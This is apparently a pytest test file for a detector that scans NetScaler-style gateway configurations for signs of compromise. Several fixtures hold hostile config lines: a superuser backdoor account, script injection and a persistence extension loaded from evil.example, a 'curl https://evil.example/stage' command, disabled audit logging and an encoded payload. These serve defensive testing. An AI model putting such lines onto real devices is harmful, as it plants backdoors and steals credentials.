from dataclasses import FrozenInstanceError

import pytest

from scalar.detect.config_forensics import analyze_config
from scalar.detect.severity import Severity

SAFE = """\
set ns hostName ns-gw-01
set ns ip 10.0.0.10 -mgmtAccess ENABLED -ssh ENABLED -gui ENABLED -telnet DISABLED
add system user sc_nitro 0123456789abcdef0123456789abcdef -encrypted -hashmethod SHA512 -allowedManagementInterface API
add audit syslogAction central 10.0.0.50 -serverPort 6514 -transport TCP -logLevel ALL
add ntp server 10.0.0.20
set ssl parameter -ssl3 DISABLED -tls1 DISABLED -tls11 DISABLED -tls12 ENABLED
"""


def test_safe_private_configuration_has_no_findings() -> None:
    report = analyze_config(SAFE, device="ns-gw-01")
    assert report.checks == ()
    assert report.user_changes == ()
    assert report.exceptional_deltas == ()
    assert report.max_severity is Severity.INFO
    assert report.normalized_line_count == 6


def test_detects_high_signal_persistence_and_injection() -> None:
    config = SAFE + """\
add system user backdoor abcdefabcdefabcdefabcdefabcdefab -encrypted -hashmethod SHA512
bind system user backdoor superuser 0
bind system group contractors -policyName superuser 100
add rewrite action credential_capture insert_before "HTTP.RES.BODY(1000)" q{"<script src=https://evil.example/a.js?token=secret></script>"}
import ns extension https://evil.example/persist.lua?key=secret persist
set audit syslogParams -logLevel NONE
disable ns feature AppFw
"""
    report = analyze_config(config, device="ns-gw-01")
    ids = {check.id for check in report.checks}
    assert {
        "suspicious-management-user",
        "management-superuser-grant",
        "management-group-superuser-grant",
        "response-script-injection",
        "ns-extension-present",
        "audit-logging-disabled",
        "security-feature-disabled",
    } <= ids
    assert report.max_severity is Severity.CRITICAL
    all_evidence = "\n".join(line for check in report.checks for line in check.evidence)
    assert "abcdefabcdefabcdefabcdefabcdefab" not in all_evidence
    assert "token=secret" not in all_evidence
    assert "key=secret" not in all_evidence
    assert "<redacted>" in all_evidence


def test_reports_added_removed_and_changed_users_without_passwords() -> None:
    previous = SAFE + (
        "add system user old_admin aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -encrypted -hashmethod SHA512\n"
        "add system user changed_user bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb -encrypted -hashmethod SHA512\n"
    )
    current = SAFE + (
        "add system user new_admin cccccccccccccccccccccccccccccccc -encrypted -hashmethod SHA512\n"
        "add system user changed_user dddddddddddddddddddddddddddddddd -encrypted -hashmethod SHA512\n"
    )
    report = analyze_config(current, previous_text=previous)
    assert [(delta.username, delta.change) for delta in report.user_changes] == [
        ("changed_user", "changed"),
        ("new_admin", "added"),
        ("old_admin", "removed"),
    ]
    assert {"management-user-added", "management-user-changed", "management-user-removed"} <= {
        check.id for check in report.checks
    }
    rendered = repr(report)
    for secret in ("a" * 32, "b" * 32, "c" * 32, "d" * 32):
        assert secret not in rendered


def test_reports_auth_shift_and_protective_control_removal() -> None:
    previous = SAFE + """\
add ns acl admin_only ALLOW -srcIP 10.0.0.0/24
add authentication samlAction corp_saml -samlIdPCertName corp_idp -samlSigningCertName corp_sp
"""
    current = SAFE + (
        "add authentication samlAction corp_saml -samlIdPCertName new_idp "
        "-samlSigningCertName corp_sp\n"
    )
    report = analyze_config(current, previous_text=previous)
    assert any(delta.object == "ns acl" and delta.kind == "removed"
               for delta in report.exceptional_deltas)
    assert any(delta.object == "authentication samlaction" and delta.kind == "modified"
               for delta in report.exceptional_deltas)
    assert "protective-control-removed" in {check.id for check in report.checks}


def test_detects_public_management_legacy_tls_commands_and_encoding() -> None:
    config = """\
set ns ip 8.8.8.8 -mgmtAccess ENABLED -telnet ENABLED
set ssl parameter -ssl3 ENABLED -tls1 ENABLED
add responder action run redirect "curl https://evil.example/stage"
add rewrite action packed replace "HTTP.RES.BODY(100)" "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
"""
    report = analyze_config(config)
    assert {
        "public-management-access",
        "cleartext-management-service",
        "legacy-tls-enabled",
        "embedded-system-command",
        "encoded-config-payload",
    } <= {check.id for check in report.checks}


def test_near_misses_do_not_generate_noisy_findings() -> None:
    config = """\
set ns ip 192.0.2.10 -mgmtAccess DISABLED -telnet DISABLED -ftp DISABLED
add responder action maintenance respondwith '"HTTP/1.1 503 Service Unavailable"'
add rewrite action header insert_http_header X-Content-Type-Options '"nosniff"'
add authentication samlAction corp -samlIdPCertName idp -samlSigningCertName sp -signatureAlg RSA-SHA256
set ssl parameter -ssl3 DISABLED -tls1 DISABLED -tls11 DISABLED -tls12 ENABLED
"""
    assert analyze_config(config).checks == ()


def test_results_are_immutable_and_dedup_is_stable() -> None:
    config = "set audit syslogParams -logLevel NONE\n"
    first = analyze_config(config, device="adc-1")
    second = analyze_config(config, device="adc-1")
    assert first.checks[0].dedup_key == second.checks[0].dedup_key
    with pytest.raises(FrozenInstanceError):
        first.checks[0].title = "changed"  # type: ignore[misc]
    with pytest.raises(FrozenInstanceError):
        first.device = "changed"  # type: ignore[misc]
